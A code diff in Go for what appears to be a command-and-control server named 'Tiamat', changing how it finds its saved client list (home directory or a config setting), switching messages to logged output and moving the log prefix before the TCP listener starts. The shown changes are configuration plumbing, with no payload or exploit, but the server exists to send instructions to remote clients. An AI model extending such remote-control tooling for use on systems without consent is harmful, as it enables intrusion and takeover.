@@ -13,10 +13,12 @@ import (
 )
 
 var (
-	C2Port         string = "1302"
-	clientList     []Client
-	clientIDs      int    = 0
-	clientJSONPath string = "/home/raul/.config/tiamat/clients.json"
+	C2Port     string = "1302"
+	clientList []Client
+	clientIDs  int = 0
+
+	isUsingJSONParameter bool
+	clientJSONPath       string = "/.config/tiamat/clients.json"
 )
 
 func (c Client) Instruct(i Instructions) error {
@@ -29,11 +31,26 @@ func (c Client) Instruct(i Instructions) error {
 }
 
 func recoverClients() error {
+	var fileToOpen string
+	home, err := os.UserHomeDir()
+	if err != nil {
+		return err
+	}
+	if isUsingJSONParameter == false {
+		fileToOpen = home + clientJSONPath
+		configPath := viper.GetString("Server.ClientPath")
+		if configPath != "" {
+			fileToOpen = configPath
+		}
+	} else {
+		fileToOpen = clientJSONPath
+	}
+
 	clients := ClientJSON{}
-	file, err := os.Open(clientJSONPath)
+	file, err := os.Open(fileToOpen)
 	if err != nil {
 		if os.IsNotExist(err) {
-			fmt.Println("CLIENTJSON DOES NOT EXIST")
+			log.Printf("Missing file at %v\n", fileToOpen)
 			return nil
 		}
 		return err
@@ -54,6 +71,7 @@ func recoverClients() error {
 }
 
 func Server() {
+	log.SetPrefix("[TIAMAT] ")
 	p := viper.GetString("Server.Port")
 	if p != "" {
 		C2Port = p
@@ -63,8 +81,6 @@ func Server() {
 	if err := recoverClients(); err != nil {
 		log.Fatalf("Error happened recovering clients: %v\n", err)
 	}
-
-	log.SetPrefix("[TIAMAT] ")
 
 	ln, err := net.Listen("tcp", ":"+C2Port)
 	if err != nil {
